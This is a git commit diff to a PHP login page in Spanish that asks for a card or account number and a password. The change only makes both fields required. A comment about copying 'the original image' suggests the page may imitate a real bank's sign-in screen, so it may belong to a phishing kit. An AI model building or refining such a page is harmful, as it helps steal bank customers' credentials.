d3448866d3e59ccd2a3587f76dda1252051f6cc9
josemonzalve16-lgtm <josemonzalve16@gmail.com>
2026-05-26 11:15:24 -0500

    Update index.php

--- index.php
+++ index.php
@@ -118,7 +118,7 @@ ob_end_clean();
         <div id="step1" class="space-y-6">
             <div class="input-line py-2">
                 <p class="text-xs text-gray-400 mb-1">No. Tarjeta / No. Cuenta / Código de cliente</p>
-                <input type="text" id="userField" name="usr" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric">
+                <input type="text" id="userField" name="usr" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric" required>
             </div>
 
             <!-- Checkbox de la imagen original -->
@@ -144,7 +144,7 @@ ob_end_clean();
             </div>
             <div class="input-line py-2 relative">
                 <p class="text-xs text-gray-400 mb-1">Ingresa contraseña</p>
-                <input type="password" name="pass" id="passField" class="w-full outline-none text-lg text-gray-700">
+                <input type="password" name="pass" id="passField" class="w-full outline-none text-lg text-gray-700" required>
                 <span class="absolute right-2 bottom-3 text-red-600 cursor-pointer">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
